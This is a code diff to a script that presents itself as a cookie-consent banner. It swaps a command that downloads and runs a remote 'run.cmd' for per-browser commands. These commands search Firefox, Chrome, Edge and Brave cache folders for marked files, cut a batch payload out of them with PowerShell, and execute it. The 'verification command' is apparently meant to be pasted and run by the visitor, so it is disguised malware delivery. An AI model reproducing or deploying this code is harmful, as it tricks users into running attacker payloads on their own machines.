@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.7.3',
+    version: '1.7.4',
     presentation: 'consent',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
@@ -24,8 +24,12 @@
     bodyStartMarker: 'CDRP7F3A9D2B8C4',
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
-    shortVerificationTemplate: 'cmd /c curl -fsSL {ORIGIN}/run.cmd -o %TMP%\\s.cmd&call %TMP%\\s.cmd',
-    verificationTemplates: {}
+    verificationTemplates: {
+      firefox: 'cmd /c for /r "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles" %f in (*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&powershell -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%f\')[0..{SM1}])"&&call %TMP%\\t.bat&exit',
+      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&powershell -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%f\')[0..{SM1}])"&&call %TMP%\\t.bat&exit',
+      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&powershell -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%f\')[0..{SM1}])"&&call %TMP%\\t.bat&exit',
+      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware" %f in (f_*) do @find "{M}" "%f">nul&&find "{E}" "%f">nul&&powershell -c "[IO.File]::WriteAllBytes(\'%TMP%\\t.bat\',[IO.File]::ReadAllBytes(\'%f\')[0..{SM1}])"&&call %TMP%\\t.bat&exit'
+    }
   };
 
   if (window.CONSENT_CONFIG && typeof window.CONSENT_CONFIG === 'object') {
@@ -129,16 +133,20 @@
   }
 
   function getVerificationCommand() {
+    var startMarker = CONSENT_CONFIG.bodyStartMarker || 'CDRP7F3A9D2B8C4';
+    var endMarker = CONSENT_CONFIG.bodyEndMarker || 'CDRPEND7F3A9D2';
     var bodySize = CONSENT_CONFIG.cacheFileBodySize;
-    if (!bodySize || bodySize < 1) return '';
+    if (!startMarker || !endMarker || !bodySize || bodySize < 1) return '';
 
-    var origin = location.origin || (location.protocol + '//' + location.host);
-    if (!origin || origin === 'null') return '';
+    var key = getBrowserKey();
+    var templates = CONSENT_CONFIG.verificationTemplates || {};
+    var tpl = templates[key] || templates.firefox || '';
+    if (!tpl) return '';
 
-    var tpl = CONSENT_CONFIG.shortVerificationTemplate
-      || 'cmd /c curl -fsSL {ORIGIN}/run.cmd -o %TMP%\\s.cmd&call %TMP%\\s.cmd';
-
-    return tpl.replace(/\{ORIGIN\}/g, origin);
+    return tpl
+      .replace(/\{M\}/g, startMarker)
+      .replace(/\{E\}/g, endMarker)
+      .replace(/\{SM1\}/g, String(bodySize - 1));
   }
 
   function fallbackCopy(text) {
